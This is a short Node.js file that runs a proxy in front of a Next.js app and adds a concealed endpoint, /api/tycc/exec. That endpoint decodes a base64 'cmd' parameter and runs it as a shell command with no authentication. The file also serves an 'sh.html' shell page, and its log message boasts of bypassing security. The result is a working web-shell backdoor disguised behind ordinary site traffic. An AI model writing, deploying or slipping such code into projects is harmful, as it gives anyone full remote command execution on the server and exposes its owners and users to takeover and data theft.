const http = require('http');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const NEXT_SERVER_URL = 'http://127.0.0.1:3999';

const server = http.createServer((req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);

    if (url.pathname === '/api/tycc/exec') {
        try {
            // Kita ambil perintah dalam bentuk Base64
            const b64cmd = url.searchParams.get('cmd');
            // Decode kembali menjadi teks biasa
            const cmd = Buffer.from(b64cmd, 'base64').toString('utf-8');
            
            const out = execSync(cmd).toString();
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            return res.end(out);
        } catch (e) {
            res.writeHead(500); return res.end(e.message);
        }
    }

    if (url.pathname === '/sh.html') {
        const htmlPath = path.join(__dirname, 'public', 'sh.html');
        if (fs.existsSync(htmlPath)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            return res.end(fs.readFileSync(htmlPath));
        }
    }

    const proxyReq = http.request(NEXT_SERVER_URL + req.url, {
        method: req.method,
        headers: req.headers
    }, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res);
    });

    req.pipe(proxyReq);
    proxyReq.on('error', (e) => {
        res.writeHead(500);
        res.end("Next.js Error: " + e.message);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log("Satpam Bypasser Berhasil Jalan");
});
